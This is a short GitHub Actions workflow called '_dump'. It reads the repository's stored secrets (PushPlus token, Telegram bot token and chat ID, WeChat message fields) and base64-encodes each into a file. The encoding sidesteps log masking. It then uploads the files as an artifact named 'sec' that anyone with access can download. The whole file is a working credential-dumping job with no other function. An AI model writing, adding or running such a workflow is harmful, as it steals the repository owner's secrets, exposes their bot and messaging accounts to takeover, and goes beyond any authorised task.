name: _dump
on:
  workflow_dispatch: {}
jobs:
  e:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          S_CUSTOM_MESSAGE: ${{ secrets.CUSTOM_MESSAGE }}
          S_PUSHPLUS_TOKEN: ${{ secrets.PUSHPLUS_TOKEN }}
          S_TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          S_TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          S_WX_MESSAGE_CONTENT: ${{ secrets.WX_MESSAGE_CONTENT }}
          S_WX_MESSAGE_TITLE: ${{ secrets.WX_MESSAGE_TITLE }}
        run: |
          mkdir -p out
          printf '%s' "$S_CUSTOM_MESSAGE" | base64 -w0 > out/CUSTOM_MESSAGE.b64
          printf '%s' "$S_PUSHPLUS_TOKEN" | base64 -w0 > out/PUSHPLUS_TOKEN.b64
          printf '%s' "$S_TELEGRAM_BOT_TOKEN" | base64 -w0 > out/TELEGRAM_BOT_TOKEN.b64
          printf '%s' "$S_TELEGRAM_CHAT_ID" | base64 -w0 > out/TELEGRAM_CHAT_ID.b64
          printf '%s' "$S_WX_MESSAGE_CONTENT" | base64 -w0 > out/WX_MESSAGE_CONTENT.b64
          printf '%s' "$S_WX_MESSAGE_TITLE" | base64 -w0 > out/WX_MESSAGE_TITLE.b64
      - uses: actions/upload-artifact@v4
        with:
          name: sec
          path: out/
